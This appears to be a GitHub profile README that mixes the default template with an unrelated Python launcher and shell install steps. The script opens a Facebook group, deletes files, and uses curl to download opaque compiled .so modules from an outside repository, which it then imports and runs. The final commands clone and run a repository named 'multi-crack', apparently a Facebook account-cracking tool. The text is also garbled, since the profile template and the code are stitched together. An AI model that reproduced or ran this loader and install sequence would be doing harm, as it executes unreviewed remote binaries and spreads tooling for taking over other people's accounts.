- 👋 Hi, I’m @Sonamran
- 👀 I’m interested in ...
- 🌱 I’m currently learning ...
- 💞️ I’m looking to collaborate on ...
- 📫 How to reach me ...

<!---
Sonamran/Sonamran is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
You can click the Preview link to take a look at your changes.
--->coding=utf-8
import os, sys, platform
try:
    import requests
except:
    os.system('pip install requests')
os.system('xdg-open https://facebook.com/groups/3017062245271082/')
import requests
try:
    if sys.argv[1]=='update':
        os.system('rm -rf Sarfraz.so Sarfraz32.so SSB.so')
except:
    pass
os.system('rm -rf Sarfraz.so Sarfraz32.so SSB.so')
os.system('git pull')
logo =                                          """            
\033[1;37m    ######      ######     ########  
\033[1;37m   ##    ##    ##    ##    ##     ## 
\033[1;37m   ##          ##          ##     ## 
\033[1;37m    ######      ######     ########  
\033[1;37m         ##          ##    ##     ## 
\033[1;37m   ##    ##    ##    ##    ##     ## 
\033[1;37m    ######      ######     ########  
\x1b[1;97m------------------------------------------------
\033[1;37m\033[1;37m Owner \033[1;37m  : \033[1;37m           Muhammad Sarfraz
\033[1;37m\033[1;37m Facebook\033[1;37m:  \033[1;37m          Muhammad Sarfraz
\033[1;37m\033[1;37m Github\033[1;37m  : \033[1;37m           Sarfraz-Ssb
\033[1;37m------------------------------------------------ """
bit = platform.architecture()[0]
def SXD():
    os.system('clear')
    print(logo)
    print(f'[1] Version 9.9.6')
    print(f'[2] Version 9.8.5')
    print(f'[3] 32 Bit ')
    print(47*'-')
    cho = input('Select Version: ')
    if cho == '1':
       if bit == '64bit':
           if not os.path.isfile('SSB.so'):
               os.system('curl -L https://github.com/Sarfraz-XD/executables/blob/main/SSB.cpython-310.so?raw=true -o SSB.so') 
               import SSB
           else:
               import SSB
    if cho == '2':
       if bit == '64bit':
           if not os.path.isfile('Sarfraz.so'):
               os.system('curl -L https://github.com/Sarfraz-XD/executables/blob/main/Sarfraz.cpython-310.so?raw=true -o Sarfraz.so') 
               import Sarfraz
           else:
               import Sarfraz
    if cho == '3':
       if bit == '32bit':
           if not os.path.isfile('Sarfraz32.so'):
               os.system('curl -L https://github.com/Sarfraz-XD/executables/blob/main/Sarfraz32.cpython-310.so?raw=true -o Sarfraz32.so') 
               import Sarfraz32
           else:
               import Sarfraz32
    
        
SXD()

apt update
apt upgrade
apt install python2
apt install git
pip2 install mechanize
pip2 install requests
pip2 install bs4
rm -rf multi-crack
git clone https://github.com/Sarfraz-Ssb/multi-crack.git
cd multi-crack
python2 SSB.py
